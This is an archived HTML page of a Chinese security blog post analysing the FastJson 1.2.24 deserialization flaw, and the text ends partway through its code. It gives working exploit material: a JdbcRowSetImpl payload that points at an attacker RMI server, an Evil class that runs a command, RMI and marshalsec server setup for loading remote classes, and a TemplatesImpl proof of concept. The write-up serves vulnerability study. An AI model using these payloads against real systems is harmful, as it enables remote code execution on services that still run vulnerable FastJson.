@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"l3yx.github.io","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="环境搭建创建Maven项目 123456789101112131415&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.2.24&lt;&#x2F;version&gt;&lt;&#x2F;depend">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FastJson 1.2.24 反序列化">
+<meta property="og:url" content="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="l3yx&#39;s blog">
+<meta property="og:description" content="环境搭建创建Maven项目 123456789101112131415&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.2.24&lt;&#x2F;version&gt;&lt;&#x2F;depend">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219194842317.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219200001327.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219204924165.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219205713857.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219210134852.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219213313663.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200220132549408.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219213456771.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219213725909.png">
+<meta property="article:published_time" content="2020-02-23T13:17:31.000Z">
+<meta property="article:modified_time" content="2020-02-23T06:48:21.685Z">
+<meta property="article:author" content="淚笑">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="FastJson">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="JNDI注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219194842317.png">
+
+<link rel="canonical" href="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>FastJson 1.2.24 反序列化 | l3yx's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">l3yx's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="淚笑">
+      <meta itemprop="description" content="不忘初心,方得始终">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l3yx's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          FastJson 1.2.24 反序列化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-23 21:17:31 / 修改时间：14:48:21" itemprop="dateCreated datePublished" datetime="2020-02-23T21:17:31+08:00">2020-02-23</time>
+            </span>
+
+          
+            <span id="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-meta-item leancloud_visitors" data-flag-title="FastJson 1.2.24 反序列化" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>创建Maven项目</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.20.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>FastJson是一个Java库，可用于将Java对象转换为其JSON表示，还可用于将JSON字符串转换为等效的Java对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"l3yx"</span>);</span><br><span class="line">        String user_json= JSON.toJSONString(user);</span><br><span class="line">        System.out.println(user_json);</span><br><span class="line"></span><br><span class="line">        Object user1=JSON.parse(user_json);</span><br><span class="line">        Object user2=JSON.parseObject(user_json,User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(user1.getClass().getName());</span><br><span class="line">        System.out.println(user2.getClass().getName());</span><br><span class="line">        System.out.println(((User)user2).getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219194842317.png" alt="image-20200219194842317"></p>
+<p>可以看到<code>parse(String)</code>将JSON字符串解析成了一个JSONObject对象，<code>parseObject(String,Class)</code>将JSON字符串反序列化为一个相应的Java对象</p>
+<p>另外FastJson还提供一个特殊字符段<code>@type</code>，通过这个字段可以指定反序列化任意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">        String user_json=<span class="string">"&#123;\"@type\":\"org.example.User\",\"name\":\"l3yx\"&#125;"</span>;</span><br><span class="line">        System.out.println(user_json);</span><br><span class="line"></span><br><span class="line">        Object user1=JSON.parse(user_json);</span><br><span class="line">        Object user2=JSON.parseObject(user_json,User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(user1.getClass().getName());</span><br><span class="line">        System.out.println(user2.getClass().getName());</span><br><span class="line">        System.out.println(((User)user2).getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setter..."</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219200001327.png" alt="image-20200219200001327"></p>
+<p>而且在反序列化的同时调用了对象的set方法，说明FastJson在对JSON字符串反序列化的时候，是通过setter方法对对象的属性进行赋值</p>
+<p>那么在这种情况下，找到有可以利用的setter方法的类，就能完成该漏洞的利用</p>
+<h2 id="JdbcRowSetImpl-JNDI-Reference-Payload"><a href="#JdbcRowSetImpl-JNDI-Reference-Payload" class="headerlink" title="JdbcRowSetImpl+JNDI Reference Payload"></a>JdbcRowSetImpl+JNDI Reference Payload</h2><p>先看一下<code>JdbcRowSetImpl</code>的源码</p>
+<p><img src="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219204924165.png" alt="image-20200219204924165"></p>
+<p>该类的<code>connect()</code>函数中325行和326行是一段JNDI查找远程对象的代码，如果<code>this.getDataSourceName()</code>可控并且能触发<code>connect()</code>函数的话就有可能实现JNDI注入达到RCE</p>
+<p><code>setDataSourceName(String var1)</code>函数赋值<code>dataSourceName</code></p>
+<p><img src="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219205713857.png" alt="image-20200219205713857"></p>
+<p><code>setAutoCommit(boolean var1)</code>函数调用了<code>connect()</code></p>
+<p><img src="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219210134852.png" alt="image-20200219210134852"></p>
+<p>之前说到FastJson会自动调用setter来完成对对象属性的赋值，所以这里payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">    <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://ip:port/Evil"</span>,</span><br><span class="line">    <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先<code>@type</code>字段会指定反序列化<code>com.sun.rowset.JdbcRowSetImpl</code>类</p>
+<p>然后调用<code>setDataSourceName(String var1)</code>对<code>dataSourceName</code>赋值，这里赋值为恶意的RMI服务地址</p>
+<p>最后调用<code>setAutoCommit(boolean var1)</code>从而调用<code>connect()</code>触发JNDI注入,<code>autoCommit</code>的值类型是<code>boolean</code>，这里设置<code>true</code>或<code>false</code>都可，JNDI注入部分可以参考<a href="https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw" target="_blank" rel="noopener">深入理解JNDI注入与Java反序列化漏洞利用</a></p>
+<p>下面构造一个恶意类，其中执行命令的代码可以放在构造方法，<code>getObjectInstance()</code>方法或者静态代码块中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译好的class文件放于web服务器</p>
+<p><img src="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219213313663.png" alt="image-20200219213313663"></p>
+<p>通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"java.rmi.server.hostname"</span>,<span class="string">"ip"</span>);<span class="comment">//ip为服务器外网地址</span></span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        String remote_class_server = <span class="string">"http://ip:80/"</span>;<span class="comment">//恶意对象地址</span></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Evil"</span>, <span class="string">"Evil"</span>, remote_class_server);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"Evil"</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">"start..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200220132549408.png" alt="image-20200220132549408"></p>
+<p>或者借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，直接启动一个RMI服务器，监听9999端口，并制定加载远程类<code>Evil.class</code></p>
+<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://ip/#Evil&quot; 9999</code></p>
+<p><img src="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219213456771.png" alt="image-20200219213456771"></p>
+<p>最后运行漏洞代码加载payload</p>
+<p>在高版本中Java限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将相关属性值设置为true</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>);</span><br><span class="line">        String payload = <span class="string">"&#123;\n"</span> +</span><br><span class="line">                <span class="string">"    \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n"</span> +</span><br><span class="line">                <span class="string">"    \"dataSourceName\":\"rmi://ip:9999/Evil\",\n"</span> +</span><br><span class="line">                <span class="string">"    \"autoCommit\":true\n"</span> +</span><br><span class="line">                <span class="string">"&#125;"</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/23/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219213725909.png" alt="image-20200219213725909"></p>
+<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Evil"</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())))</span>;<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">"&#123; Runtime.getRuntime().exec(\"calc\"); &#125;"</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);<span class="comment">//添加构造函数</span></span><br><span class="line">        <span class="keyword">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line"></span><br><span class="line">        String evilCode=Base64.encodeBase64String(byteCode);</span><br><span class="line"></span><br><span class="line">        String poc=<span class="string">"&#123;\n"</span> +</span><br><span class="line">                "\"@type\":\""+TemplatesImpl.class.getName()+"\",\n" +</span><br><span class="line">                <span class="string">"\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],\n"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"xx\",\n"</span> +</span><br><span class="line">                <span class="string">"\"_tfactory\":&#123; &#125;,\n"</span> +</span><br><span class="line">                <span 